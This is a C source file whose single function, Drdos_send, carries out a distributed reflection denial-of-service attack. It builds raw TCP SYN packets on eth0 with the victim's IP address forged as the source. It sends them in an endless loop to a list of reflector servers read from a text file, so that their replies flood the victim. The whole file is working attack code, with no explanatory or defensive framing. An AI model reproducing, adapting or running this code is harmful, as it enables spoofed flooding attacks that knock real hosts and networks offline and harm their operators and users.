#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <sys/stat.h>
#include <fcntl.h>
#include "kh_ca.h"


void Drdos_send()
{
  int i,ret,fd,count=0;
  char *buffer;
  off_t offset = 0;

  FILE *fp;

  fd = open( "DRDOS/Drdos_server_ip.txt", O_RDWR );

  offset = lseek( fd, (off_t)0, SEEK_END );
  buffer = (char *)calloc( offset, offset );
  lseek( fd, 0, SEEK_SET );

  ret = read( fd, buffer, offset);
  if(ret < 0) { printf("err read\n"); }

  count = 0;
  for( i = 0; (off_t)i < offset; i++ ) {
    if( *(buffer+i) == 0x2f ) { count++; }
  }

  close( fd );


  // get server_ip_addr //
  struct server_list S_list[count];
  fp = fopen("DRDOS/Drdos_server_ip.txt","r");

  for(i=0;i<count;i++){
    fscanf(fp, "%s %s",&S_list[i].server_ip, &S_list[i].server_n);
  }

  fclose(fp);


  int sock = 0;
  struct sockaddr_ll sll;

  extern int target_mac_addr_int[2][6];
  extern char *target_ip_addr_char[2];
 
  ethdr         eth;
  iphdr         ip;
  TCPhdr        TCP;
  pseudo        pseudo;

  bzero( &sll, sizeof( sll ) );
  sll.sll_family = PF_PACKET;
  sll.sll_ifindex = if_nametoindex( "eth0" );
  sll.sll_halen = 6;

  sock = socket( PF_PACKET, SOCK_RAW, 0 );

  eth.dst[0] = target_mac_addr_int[0][0];
  eth.dst[1] = target_mac_addr_int[0][1];
  eth.dst[2] = target_mac_addr_int[0][2];
  eth.dst[3] = target_mac_addr_int[0][3];
  eth.dst[4] = target_mac_addr_int[0][4];
  eth.dst[5] = target_mac_addr_int[0][5];

  eth.src[0] = target_mac_addr_int[1][0];
  eth.src[1] = target_mac_addr_int[1][1];
  eth.src[2] = target_mac_addr_int[1][2];
  eth.src[3] = target_mac_addr_int[1][3];
  eth.src[4] = target_mac_addr_int[1][4];
  eth.src[5] = target_mac_addr_int[1][5];

  eth.type = htons( 0x0800 );


  while( 1 ) {
    for( i = 0; i < count; i ++ ) {

  ip.ver = 0x04;
  ip.hlen = sizeof( ip ) >> 2;
  ip.service = 0x00;
  ip.total_len = htons( sizeof( ip ) + sizeof( TCP ) );
  ip.id = htons(0x0000);
  ip.flag = 0x40;
  ip.offset = 0x00;
  ip.ttl = 0x40;
  ip.protocol = 0x06;
  ip.checksum = 0x00;
  ip.src = inet_addr( target_ip_addr_char[1] );

  ip.dest = inet_addr( S_list[i].server_ip );

  ip.checksum = csum( (unsigned short *)&ip, sizeof( ip ) );

  TCP.src_port = htons(10000);
  TCP.dst_port = htons(80);
  TCP.seq = htonl(0x1234567a);
  TCP.ack = 0x00 ;
  TCP.unused = 0x00;
  TCP.hlen = sizeof( TCP ) >> 2;
  TCP.flag = 0x02;
  TCP.win = htons ( 65535 );
  TCP.checksum = 0x00;
  TCP.dummy = 0x00;

  pseudo.src = ip.src;
  pseudo.dst = ip.dest;
  pseudo.zero = 0x00;
  pseudo.protocol = ip.protocol;
  pseudo.length = htons( sizeof( TCP ) );
  memcpy( &pseudo.TCPhdr, &TCP, sizeof( TCP ) );

  TCP.checksum = csum( (unsigned short *)&pseudo, sizeof( pseudo ) );

  char gData[ sizeof( ethdr ) + sizeof( iphdr ) + sizeof( TCPhdr ) ];

  memcpy( gData, &eth, sizeof( eth ) );
  memcpy( gData + sizeof( eth ), &ip, sizeof( ip ) );
  memcpy( gData + sizeof( eth ) + sizeof( ip ), &TCP, sizeof( TCP ) );

  sendto( sock, gData, sizeof( eth ) + sizeof( ip ) + sizeof( TCP ),
                          0, (struct sockaddr *)&sll, sizeof( sll ) );

    }
  }
}
